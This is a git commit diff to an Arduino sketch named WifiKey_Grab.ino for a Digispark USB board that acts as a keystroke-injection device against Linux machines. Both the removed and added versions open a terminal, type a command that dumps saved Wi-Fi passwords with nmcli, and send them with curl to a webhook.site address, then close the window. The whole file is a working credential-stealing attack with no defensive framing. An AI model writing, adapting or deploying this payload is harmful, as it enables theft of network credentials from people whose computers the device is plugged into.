28987e1165d4140c455a928f6b203c1ccd974fa7
Yehia Elborma <42983220+borma425@users.noreply.github.com>
2022-10-07 13:36:29 -0400

    Update WifiKey_Grab.ino

--- scripts/linux/WifiKey_Grab.ino
+++ scripts/linux/WifiKey_Grab.ino
@@ -1,29 +1,24 @@
+
 #include "DigiKeyboard.h"
 
-#define KEY_ENTER 0x28 //Return/Enter Key
-
 void setup() {
-  pinMode(1, OUTPUT); //LED on Model A 
 }
 
 void loop() {
 
   DigiKeyboard.update();
+
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(3000);
-
-  DigiKeyboard.sendKeyStroke(0x17,MOD_ALT_LEFT,MOD_CONTROL_RIGHT);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println('OUTPUT=$(nmcli device wifi show-password);curl --data "${OUTPUT}" https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE>'); 
   DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("exit");
-  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(0x17,MOD_ALT_LEFT);
+  DigiKeyboard.delay(500);
 
-  digitalWrite(1, HIGH); //turn on led when program finishes
-  DigiKeyboard.delay(90000);
-  digitalWrite(1, LOW); 
-  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("OUTPUT=$(nmcli device wifi show-password);curl --data \"${OUTPUT}\" https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE>;exit");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(2000);
+ for(;;){ /*empty*/ }
+ 
 
 }
